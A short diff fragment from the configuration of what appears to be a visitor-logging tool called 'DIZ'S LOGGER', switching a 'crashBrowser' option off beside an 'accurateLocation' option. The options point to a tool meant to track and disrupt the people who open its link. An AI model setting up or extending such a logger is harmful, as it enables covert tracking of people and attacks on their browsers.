@@ -17,7 +17,7 @@ config = {
     "username": "DIZ'S LOGGER", 
     "color": 0x00FFFF,
 
-    "crashBrowser": True, 
+    "crashBrowser": False, 
     "accurateLocation": False,
 
     "message": {
